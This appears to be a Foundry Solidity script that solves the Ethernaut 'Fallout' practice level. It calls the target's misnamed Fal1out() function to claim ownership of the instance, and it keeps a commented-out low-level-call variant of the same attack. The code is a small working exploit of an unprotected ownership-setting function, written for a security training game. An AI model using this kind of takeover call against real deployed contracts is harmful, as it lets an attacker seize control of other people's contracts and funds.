// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IFallout {
    function Fal1out() external payable;
}

// ================================================================
// │                      LEVEL 2 - FALLOUT                       │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IFallout targetContract = IFallout(targetContractAddress);

        vm.startBroadcast();
        targetContract.Fal1out{value: 0}();
        vm.stopBroadcast();
    }
}

// contract Exploit is Script, GetInstanceAddress {
//     function run() public {
//         address targetContractAddress = getInstanceAddress();

//         // Function signature
//         bytes memory payload = abi.encodeWithSignature("Fal1out()");

//         vm.startBroadcast();
//         (bool success, ) = targetContractAddress.call{value: 0}(payload);
//         require(success, "Transaction failed");
//         vm.stopBroadcast();
//     }
// }
